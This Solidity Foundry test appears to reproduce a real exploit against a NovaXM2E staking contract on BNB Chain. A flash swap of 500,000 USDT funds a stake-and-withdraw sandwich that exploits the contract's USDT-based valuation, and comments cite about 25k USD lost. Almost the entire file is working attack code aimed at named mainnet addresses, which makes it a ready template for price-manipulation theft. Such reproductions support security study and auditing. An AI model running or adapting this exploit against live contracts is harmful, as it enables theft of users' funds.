// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo -- Total Lost : ~25k USD
// TX : https://bscscan.com/tx/0xb1ad1188d620746e2e64785307a7aacf2e8dbda4a33061a4f2fbc9721048e012
// GUY : https://x.com/EXVULSEC/status/1820676684410147276
// Reason: stake contract will change the token value into usdt value,and withdraw will use this value to cal the amount of token to the 
// attacker, so it's easy to sandwitch the stake and withdraw.

interface ITokenStake {
    function stakeIndex() external returns (uint);

    function stake(uint _poolId, uint _stakeValue) external;

    function withdraw(uint _stakeId) external;
}


contract ContractTest is Test {
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Router_V2 constant router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 constant Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 constant USDT = IERC20((0x55d398326f99059fF775485246999027B3197955));
    IERC20  NovaXM2E = IERC20(0xB800AFf8391aBACDEb0199AB9CeBF63771FcF491);
    uint256 swapamount;
    ITokenStake tokenStake = ITokenStake(0x55C9EEbd368873494C7d06A4900E8F5674B11bD2);

    function setUp() public {
        vm.createSelectFork("bsc", 41116210);
        deal(address(USDT),address(this),0);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[End] Attacker USDT balance before exploit", USDT.balanceOf(address(this)) , 18);
        swapamount = 500_000 ether;
        Pair.swap(swapamount,0, address(this), new bytes(1));
        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)) , 18);
    }


    function pancakeCall(
        address, /*sender*/
        uint256, /*amount0*/
        uint256, /*amount1*/
        bytes calldata /*data*/
    ) public {
        swap_token_to_token(address(USDT),address(NovaXM2E),USDT.balanceOf(address(this)));
        NovaXM2E.approve(address(tokenStake),NovaXM2E.balanceOf(address(this)));
        tokenStake.stake(0,NovaXM2E.balanceOf(address(this))/2);
        swap_token_to_token(address(NovaXM2E),address(USDT),NovaXM2E.balanceOf(address(this)));
        uint stakeIndex = tokenStake.stakeIndex();
        tokenStake.withdraw(stakeIndex);
        swap_token_to_token(address(NovaXM2E),address(USDT),NovaXM2E.balanceOf(address(this)));
        USDT.transfer(address(Pair),swapamount * 10_000 / 9975 + 1000);
    }

    receive() external payable {
        // payable(address(MARS)).transfer(address(this).balance);
    }

    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
    );}

}
